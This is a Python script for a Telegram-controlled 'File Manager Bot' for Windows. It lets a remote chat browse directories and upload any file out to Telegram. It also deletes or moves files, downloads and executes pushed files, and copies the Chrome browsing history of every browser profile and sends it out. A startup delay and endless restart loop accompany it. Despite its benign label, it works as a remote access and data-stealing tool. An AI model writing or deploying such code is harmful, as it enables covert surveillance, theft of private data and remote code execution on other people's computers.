import os
import shutil
import requests
import time
import difflib
import subprocess
import sqlite3
from datetime import datetime, timedelta

# ===== CONFIG =====
from config import BOT_TOKEN, CHAT_ID, API_URL

# Default working directory = Downloads
cwd = os.path.join(os.path.expanduser("~"), "Downloads")
os.makedirs(cwd, exist_ok=True)

# ===== HELPERS =====
def send_message(text):
    try:
        requests.post(f"{API_URL}sendMessage", data={"chat_id": CHAT_ID, "text": text})
    except Exception as e:
        print("Message error:", e)

def send_file(file_path):
    if os.path.exists(file_path):
        try:
            with open(file_path, "rb") as f:
                requests.post(f"{API_URL}sendDocument",
                              data={"chat_id": CHAT_ID},
                              files={"document": f})
            send_message(f"✅ Uploaded: {os.path.basename(file_path)}")
        except Exception as e:
            send_message(f"❌ Upload failed: {e}")
    else:
        send_message(f"❌ File not found: {file_path}")

def download_file(file_id, save_dir=cwd):
    try:
        resp = requests.get(f"{API_URL}getFile?file_id={file_id}").json()
        file_path = resp["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        filename = os.path.basename(file_path)
        save_path = os.path.join(save_dir, filename)

        base, ext = os.path.splitext(save_path)
        counter = 1
        while os.path.exists(save_path):
            save_path = f"{base} ({counter}){ext}"
            counter += 1

        r = requests.get(file_url)
        with open(save_path, "wb") as f:
            f.write(r.content)

        send_message(f"✅ Downloaded: {os.path.basename(save_path)} → {save_dir}")
    except Exception as e:
        send_message(f"❌ Download failed: {e}")

def match_name(partial, directory, want_dir=False):
    try:
        candidates = os.listdir(directory)
        if want_dir:
            candidates = [c for c in candidates if os.path.isdir(os.path.join(directory, c))]
        else:
            candidates = [c for c in candidates if os.path.exists(os.path.join(directory, c))]
    except Exception:
        return None, []

    for c in candidates:
        if c.lower() == partial.lower():
            return c, []

    matches = [c for c in candidates if c.lower().startswith(partial.lower())]
    if len(matches) == 1:
        return matches[0], []
    elif len(matches) > 1:
        return None, matches

    close = difflib.get_close_matches(partial, candidates, n=1, cutoff=0.3)
    if close:
        return close[0], []

    return None, []

# ===== CHROME HISTORY =====
def get_chrome_history(hours=12):
    paths = []
    user_dir = os.path.expanduser("~")
    chrome_user_data = os.path.join(user_dir, "AppData", "Local", "Google", "Chrome", "User Data")

    if not os.path.exists(chrome_user_data):
        send_message("❌ Chrome directory not found")
        return

    for profile in os.listdir(chrome_user_data):
        profile_path = os.path.join(chrome_user_data, profile)
        history_db = os.path.join(profile_path, "History")
        if os.path.exists(history_db):
            paths.append((profile, history_db))

    results = []
    epoch_start = datetime(1601, 1, 1)
    cutoff_chrome = int((datetime.utcnow() - epoch_start).total_seconds() * 1000000) - (hours * 3600 * 1000000)

    for profile, db_path in paths:
        tmp_db = os.path.join(os.getenv("TEMP"), f"{profile}_History")
        try:
            shutil.copy2(db_path, tmp_db)
        except:
            continue

        try:
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, last_visit_time 
                FROM urls 
                WHERE last_visit_time > ?
                ORDER BY last_visit_time DESC
            """, (cutoff_chrome,))
            rows = cursor.fetchall()
            if rows:
                results.append(f"🖥 Profile: {profile}\n")
                for url, title, last_visit in rows:
                    visit_time = epoch_start + timedelta(microseconds=last_visit)
                    results.append(f"{visit_time.strftime('%Y-%m-%d %H:%M:%S')} - {title} - {url}")
                results.append("\n")
            conn.close()
        except Exception as e:
            send_message(f"❌ Failed to read {profile}: {e}")
        finally:
            os.remove(tmp_db)

    if results:
        file_path = os.path.join(os.getenv("TEMP"), "chrome_history.txt")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("\n".join(results))
        send_file(file_path)
        os.remove(file_path)
    else:
        send_message("❌ No history found in the last 12 hours")

# ===== COMMAND HANDLER =====
def handle_command(cmd):
    global cwd
    parts = cmd.split(" ", 2)
    base = parts[0].lower()

    if base == "pwd":
        send_message(f"📂 {cwd}")

    elif base == "ls":
        try:
            entries = os.listdir(cwd)
            entries = [f for f in entries if not f.startswith("~$") and not f.startswith(".")]
            entries.sort()
            out_text = "\n".join([f if len(f) <= 50 else f[:47] + "..." for f in entries])
            for i in range(0, len(out_text), 4000):
                send_message(out_text[i:i + 4000])
        except Exception as e:
            send_message(f"❌ {e}")

    elif base == "cd":
        if len(parts) >= 2:
            target_input = parts[1]
            if target_input == "..":
                cwd = os.path.abspath(os.path.join(cwd, ".."))
                send_message(f"📂 Moved to parent: {cwd}")
                return
            elif os.path.isabs(target_input):
                if os.path.isdir(target_input):
                    cwd = os.path.abspath(target_input)
                    send_message(f"📂 Moved to: {cwd}")
                else:
                    send_message("❌ Invalid absolute path")
                return
            target, options = match_name(target_input, cwd, want_dir=True)
            if target:
                cwd = os.path.abspath(os.path.join(cwd, target))
                send_message(f"📂 Moved to: {cwd}")
            elif options:
                send_message(f"❓ Multiple matches: {', '.join(options)}")
            else:
                send_message("❌ No matching folder")
        else:
            send_message("❌ Usage: cd <folder>")

    elif base in ["upload", "send", "rm", "cp", "mv", "run", "exec", "cat", "head", "tail", "history"]:
        if base == "history":
            if len(parts) >= 2 and parts[1].lower() == "chrome":
                get_chrome_history(12)
            else:
                send_message("❌ Usage: history chrome")
            return

        if len(parts) >= 2:
            target, options = match_name(parts[1], cwd, want_dir=False)
            if not target and options:
                send_message(f"❓ Multiple matches: {', '.join(options)}")
                return
            if not target:
                send_message("❌ No matching file")
                return
            full_target = os.path.join(cwd, target)

            if base in ["upload", "send"]:
                send_file(full_target)
            elif base == "rm":
                try:
                    os.remove(full_target)
                    send_message(f"🗑 Deleted: {target}")
                except Exception as e:
                    send_message(f"❌ {e}")
            elif base == "cp" and len(parts) == 3:
                dest = os.path.join(cwd, parts[2])
                try:
                    shutil.copy2(full_target, dest)
                    send_message(f"✅ Copied {target} → {dest}")
                except Exception as e:
                    send_message(f"❌ {e}")
            elif base == "mv" and len(parts) == 3:
                dest = os.path.join(cwd, parts[2])
                try:
                    shutil.move(full_target, dest)
                    send_message(f"✅ Moved {target} → {dest}")
                except Exception as e:
                    send_message(f"❌ {e}")
            elif base in ["run", "exec"]:
                if os.path.isfile(full_target):
                    try:
                        os.startfile(full_target)
                        send_message(f"✅ Executed: {target}")
                    except Exception as e:
                        send_message(f"❌ Failed to execute: {e}")
                else:
                    send_message("❌ Target is not a file")
            elif base == "cat":
                try:
                    with open(full_target, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read(4000)
                        send_message(f"📄 {target}:\n{content}" + ("\n… (truncated)" if f.read(1) else ""))
                except Exception as e:
                    send_message(f"❌ Cannot read file: {e}")
            elif base in ["head", "tail"]:
                n = int(parts[2]) if len(parts) == 3 and parts[2].isdigit() else 10
                try:
                    with open(full_target, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                        if base == "head":
                            send_message(f"📄 Head {n} lines of {target}:\n{''.join(lines[:n])}")
                        else:
                            send_message(f"📄 Tail {n} lines of {target}:\n{''.join(lines[-n:])}")
                except Exception as e:
                    send_message(f"❌ Cannot read file: {e}")
        else:
            send_message(f"❌ Usage: {base} <file> [dest]")

    elif base == "mkdir":
        if len(parts) == 2:
            os.makedirs(os.path.join(cwd, parts[1]), exist_ok=True)
            send_message(f"📂 Created folder: {parts[1]}")
        else:
            send_message("❌ Usage: mkdir <folder>")

    elif base == "help":
        send_message("""
📂 FILE MANAGER BOT 📂

pwd                 → Show current directory
ls                  → List files/folders
cd <dir>            → Change directory
upload <file>       → Upload file to Telegram
send <file>         → Alias of upload
cp <src> <dst>      → Copy file
mv <src> <dst>      → Move/Rename file
rm <file>           → Delete file
mkdir <folder>      → Create folder
run/exec <file>     → Execute file
cat <file>          → Read first 4k chars
head <file> [n]     → Show first n lines
tail <file> [n]     → Show last n lines
history chrome      → Get last 12h Chrome history for all profiles
exit                → Shut down bot
""")

# ===== MAIN LOOP =====
def bot_loop():
    send_message("🤖 File Manager Bot Online. Type 'help' for commands.")
    last_update_id = None
    try:
        requests.get(f"{API_URL}getUpdates", params={"offset": -1})
    except:
        pass

    while True:
        try:
            params = {"timeout": 100, "offset": last_update_id + 1} if last_update_id else {"timeout": 100}
            updates = requests.get(f"{API_URL}getUpdates", params=params).json()

            for u in updates.get("result", []):
                last_update_id = u["update_id"]
                msg = u.get("message", {})

                if "document" in msg:
                    file_id = msg["document"]["file_id"]
                    download_file(file_id, cwd)
                    continue

                text = msg.get("text", "").strip()
                if not text:
                    continue

                if text.lower() == "exit":
                    send_message("🛑 Shutting down.")
                    return
                else:
                    handle_command(text)
        except Exception as e:
            print("Connection lost, retrying in 10s:", e)
            time.sleep(10)

# ===== ENTRY POINT =====
if __name__ == "__main__":
    print(" Starting in 5 mins⏳ Boot delay, you can change this")
    time.sleep(300)
    while True:
        bot_loop()
        print("🔄 Restarting bot in 10s...")
        time.sleep(10)
